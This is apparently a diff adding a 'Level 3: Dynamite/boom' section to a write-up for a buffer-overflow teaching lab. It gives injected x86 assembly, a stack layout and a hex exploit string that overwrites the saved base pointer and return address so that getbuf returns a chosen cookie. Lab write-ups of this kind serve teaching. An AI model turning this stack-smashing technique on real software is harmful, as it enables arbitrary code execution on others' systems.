@@ -160,3 +160,36 @@ c3
 00 00
 12 fa 68 55
 ```
+
+## Level 3: Dynamite/boom
+
+Target: supply an exploit string that will cause getbuf to return your cookie back to test
+
+Change return value of `getbuf`. Namely, change the value of `%eax` and return to the same
+address `0x08049501` in `test`.
+
+```assembly
+mov		$0x20ba0521,%eax
+push	$0x08049501
+ret
+```
+
+In order to get back to `test`, we need also to maintain `%ebp` => `0x5568fa60`
+
+* 0~11: assembly code
+* 12~45: nothing
+* 46~49: old ebp
+* 50~53: buf address
+
+```
+b8 21 05 ba 20
+68 01 95 04 08
+c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00
+60 fa 68 55
+12 fa 68 55
+```
